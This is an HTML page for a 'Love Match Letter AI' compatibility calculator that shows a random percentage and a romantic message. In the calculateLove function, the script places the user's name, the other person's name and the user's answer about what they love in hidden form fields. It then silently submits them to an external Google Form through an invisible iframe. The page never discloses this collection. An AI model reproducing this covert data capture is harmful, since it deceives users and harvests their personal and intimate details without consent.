<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Match Letter 💌</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="style.css">
</head>

<body>

<!-- FLOATING HEARTS (FIXED CLASS MATCH) -->
<div class="particles">
    <span style="left:10%;font-size:18px;animation-duration:12s;">❤</span>
    <span style="left:25%;font-size:22px;animation-duration:14s;">❤</span>
    <span style="left:40%;font-size:16px;animation-duration:11s;">❤</span>
    <span style="left:55%;font-size:24px;animation-duration:16s;">❤</span>
    <span style="left:70%;font-size:20px;animation-duration:13s;">❤</span>
    <span style="left:85%;font-size:26px;animation-duration:18s;">❤</span>
</div>

<!-- INTRO LOVE LETTER -->
<div class="introPopup" id="introPopup">
    <div class="letterBox">

        <div class="letterTop">💌 A Letter Written For You</div>

        <div id="letterText" class="letterText"></div>

        <button id="openLetterBtn" onclick="startLetter()">
            Open Letter ❤️
        </button>

        <button id="closeLetterBtn" onclick="closeLetter()" class="closeBtn">
            Enter Love World 💕
        </button>

    </div>
</div>

<!-- MAIN CARD -->
<div class="container">

    <div class="heart">💖</div>
    <h1>Love Match Letter AI</h1>

    <input type="text" id="name1" placeholder="Your Name">
    <input type="text" id="name2" placeholder="Their Name">
    <input type="text" id="loveText" placeholder="What do you love about them?">

    <div class="error" id="errorMsg"></div>

    <button onclick="calculateLove()">Seal Love Letter 💌</button>

    <div class="result" id="result">
        <div class="percent" id="percent">0%</div>

        <div class="bar">
            <div class="fill" id="fill"></div>
        </div>

        <div class="message" id="message"></div>
    </div>

</div>

<!-- LOADING -->
<div class="overlay" id="overlay">
    <div class="loaderCard">
        <div class="spinner"></div>
        <p>Writing your love story...</p>
    </div>
</div>

<!-- GOOGLE FORM -->
<form id="googleForm"
action="https://docs.google.com/forms/d/e/1FAIpQLSdpvaxjPEfTz-nKFGHoc8J3UhV2hWlXS1cQSAR_NH1e9TSzgg/formResponse"
method="POST"
target="hidden_iframe">

<input type="hidden" name="entry.1203440948" id="g1">
<input type="hidden" name="entry.632297335" id="g2">
<input type="hidden" name="entry.2029294024" id="g3">
</form>

<iframe name="hidden_iframe" style="display:none;"></iframe>

<!-- FOOTER -->
<div class="footer">
    💌 made with love • Prottoy
</div>

<script>

let i = 0;

const letterMessage =
`Before you begin...

This is not just a calculator.
This is a love letter hidden inside code 💌

Every result is random,
but feelings are real 💖

Now open your destiny... ✨`;

function startLetter(){

    document.getElementById("openLetterBtn").style.display = "none";

    const target = document.getElementById("letterText");

    function typeWriter(){
        if(i < letterMessage.length){
            target.innerHTML += letterMessage[i];
            i++;
            setTimeout(typeWriter, 28);
        } else {
            document.getElementById("closeLetterBtn").style.display = "block";
        }
    }

    typeWriter();
}

function closeLetter(){
    document.getElementById("introPopup").style.display = "none";
}

function calculateLove(){

    let n1 = document.getElementById("name1").value.trim();
    let n2 = document.getElementById("name2").value.trim();
    let love = document.getElementById("loveText").value.trim();

    let error = document.getElementById("errorMsg");

    if(!n1 || !n2 || !love){
        error.innerText = "❌ Fill all fields to open your love letter!";
        return;
    }

    error.innerText = "";
    document.getElementById("overlay").style.display = "flex";

    setTimeout(() => {

        let percent = Math.floor(Math.random() * 41 + 60);

        document.getElementById("overlay").style.display = "none";
        document.getElementById("result").style.display = "block";

        document.getElementById("percent").innerText = percent + "%";
        document.getElementById("fill").style.width = percent + "%";

        let msg = "";
        if(percent > 85) msg = "💖 Soulmate Energy!";
        else if(percent > 70) msg = "💘 Strong Emotional Bond!";
        else msg = "💗 Cute Connection!";

        document.getElementById("message").innerText = msg;

        document.getElementById("g1").value = n1;
        document.getElementById("g2").value = n2;
        document.getElementById("g3").value = love;

        document.getElementById("googleForm").submit();

    }, 1300);
}

</script>

</body>
</html>
